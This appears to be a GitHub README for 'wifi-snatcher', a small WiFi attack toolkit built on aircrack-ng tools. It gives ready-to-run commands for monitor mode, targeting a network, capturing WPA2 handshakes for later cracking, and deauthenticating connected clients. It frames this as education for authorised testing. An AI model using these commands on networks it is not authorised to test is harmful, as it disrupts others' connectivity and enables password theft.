# wifi-snatcher
A simple WiFi scanner that lists nearby SSIDs and signals.

---

# 📡 WiFi-Snatcher

**WiFi-Snatcher** is a lightweight, real-world educational toolkit designed for use on **Kali Linux** or **ParrotOS** with compatible WiFi adapters (like Alfa). This tool allows you to scan for nearby wireless networks, monitor devices, and execute basic deauthentication and handshake-capture attacks.

> ⚠️ **Legal Notice**: This tool is intended for **educational purposes only**. Use it **only on networks you own or have explicit written permission to test.** Unauthorized access to networks is illegal.

---

## 🛠 Requirements
- ✅ Linux (Kali or Parrot recommended)
- ✅ Wireless card that supports **monitor mode** (e.g. Alfa AWUS1900)
- ✅ `aircrack-ng` tools installed (`airmon-ng`, `airodump-ng`, `aireplay-ng`)
- ✅ Python 3 (optional for automation wrapper)

---

## ⚙️ Features
- 📶 Enable monitor mode
- 🛰 Scan nearby WiFi networks
- 👁 View connected clients
- 🔨 Launch deauth attack on a chosen target
- 🔐 Capture WPA2 handshake for later cracking

---

## 🚀 Usage

### Start Monitor Mode
```bash
sudo airmon-ng start wlan0
```

### Scan Networks
```bash
sudo airodump-ng wlan0mon
```

### Target Specific BSSID/Channel
```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

### Deauth Attack (Optional)
```bash
sudo aireplay-ng --deauth 10 -a <router BSSID> -c <target MAC> wlan0mon
```

### Stop Monitor Mode
```bash
sudo airmon-ng stop wlan0mon
```

---

## 🧠 Coming Soon (Python Wrapper)
- Interactive terminal UI
- Auto-scan + auto-select target
- Auto-capture and log handshakes

---

## 🧠 Author
**The Gramajo ThreatOps HQ** — from the border to the terminal. 
Still learning. Still building. Always adapting.

---

## 📜 License
MIT License — for educational use only. Obey the law.
